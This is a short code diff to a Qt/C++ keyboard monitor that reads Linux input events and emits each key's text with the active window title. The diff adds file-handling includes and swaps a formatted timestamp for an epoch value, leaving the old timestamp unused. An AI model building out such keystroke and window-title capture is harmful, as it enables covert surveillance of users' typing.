@@ -2,6 +2,9 @@
 #include <QDebug>
 #include <QDateTime>
 #include <QTimeZone>
+#include <QDir>
+#include <QFile>
+#include <QTextStream>
 #include <linux/input.h>
 #include <fcntl.h>
 #include <unistd.h>
@@ -606,7 +609,7 @@ void KeyboardMonitor::handleKeyEvent(int keyCode, bool pressed, KeyboardDevice &
     if (!keyText.isEmpty()) {
         QString timestamp = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
         QString windowTitle = getActiveWindowTitle();
-        emit keyPressed(timestamp, windowTitle, keyText);
+        emit keyPressed(QDateTime::currentMSecsSinceEpoch(), windowTitle, keyText);
     }
 }
 
